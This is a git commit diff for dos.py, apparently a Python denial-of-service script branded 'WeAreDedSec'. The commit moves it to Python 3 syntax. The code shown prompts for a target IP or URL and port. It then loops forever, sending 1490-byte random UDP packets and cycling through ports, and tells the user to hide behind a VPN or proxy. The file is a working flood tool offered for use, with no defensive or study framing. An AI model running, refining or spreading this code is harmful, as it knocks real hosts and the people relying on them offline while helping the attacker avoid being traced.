bece7335a1b4ec4eec4cab74e27feb28d276f938
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-10-22 12:40:42 -0300

    dos.py

--- dos.py
+++ dos.py
@@ -15,14 +15,14 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet WeAreDedSec")
-print
-print "Author   : Wrench"
-print "Instagram : @jeanseven"
-print "github   : https://github.com/Jeanpseven"
-print "USE VPN ou PROXY (recommended:https://github.com/Jeanpseven/Dr4xVPN)"
-print
-target = raw_input("IP Target or URL: ")
-port = input("Port       : ")
+print()
+print("Author   : Wrench")
+print("Instagram : @jeanseven")
+print("github   : https://github.com/Jeanpseven")
+print("USE VPN ou PROXY (recommended:https://github.com/Jeanpseven/Dr4xVPN)")
+print()
+target = input("IP Target or URL: ")
+port = int(input("Port       : "))
 
 os.system("clear")
 os.system("figlet Cyber Bombing Started")
@@ -32,6 +32,6 @@ while True:
      sock.sendto(bytes, (target, port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s" % (sent, target, port)
+     print("Sent %s packet to %s through port:%s" % (sent, target, port))
      if port == 65534:
        port = 1
